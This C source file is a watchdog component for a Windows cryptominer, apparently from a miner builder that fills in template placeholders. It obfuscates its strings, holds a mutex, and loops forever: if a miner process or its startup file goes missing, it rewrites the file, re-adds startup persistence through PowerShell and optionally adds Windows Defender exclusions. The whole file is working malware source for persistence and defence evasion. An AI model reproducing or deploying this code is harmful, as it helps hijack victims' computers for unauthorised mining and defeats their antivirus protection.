#include "UFiles\ntddk.h"
#include <wchar.h>

#include "UFiles\utils.h"
#include "UFiles\common.h"
#include "UFiles\obfuscatew.h"

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hMutex;

    wchar_t mutexTemp[MAX_PATH] = { 0 };
    wcscpy(mutexTemp, AYW_OBFUSCATE(L"\\BaseNamedObjects\\#WATCHDOGID"));
    UNICODE_STRING umutex;
    INIT_UNICODE_STRING(umutex, mutexTemp);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

    UtCreateMutant(&hMutex, MUTANT_ALL_ACCESS, &attr, TRUE);

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, _wgetenv(AYW_OBFUSCATE(L"SystemRoot")), AYW_OBFUSCATE(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYW_OBFUSCATE(L"\\cmd.exe"));

    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYW_OBFUSCATE(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, _wgetenv(AYW_OBFUSCATE(L"$BASEDIR")), AYW_OBFUSCATE(L"#STARTUPFILE"));

    wchar_t libPath[MAX_PATH] = { 0 };
    combine_path(libPath, _wgetenv(AYW_OBFUSCATE(L"$CPPLIBSROOT")), AYW_OBFUSCATE(L"\\Google\\Libs\\"));

    bool hasGPU = has_gpu(sysdir, cmdPath, libPath);

    wchar_t* minerSet[][2] = { $WATCHDOGSET };

    ULONG fileSize;
    PVOID minerFile = read_file(startupPath, &fileSize);

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -((15000 + $STARTDELAY) * 10000);

    while (true) {
        UtDelayExecution(FALSE, &sleeptime);

        bool minerMissing = false;
        for (int i = 0; i < $MINERCOUNT; i++) {
            bool typeETH = !wcsicmp(AYW_OBFUSCATE(L"eth"), minerSet[i][0]);
            if (!(typeETH && !hasGPU) && !check_mutex(minerSet[i][1])) {
                minerMissing = true;
            }
        }

        bool fileMissing = !check_file_exists(startupPath);
        if (minerMissing || fileMissing) {
#if DefWDExclusions
            run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #WDCOMMAND"), powershellPath);
#endif
            run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPADD"), powershellPath, startupPath, startupPath, startupPath);
            if (fileMissing) {
                write_file(startupPath, minerFile, fileSize);
            }
            run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPSTART"), powershellPath, startupPath);
        }
    }

    UtClose(hMutex);
	return 0;
} 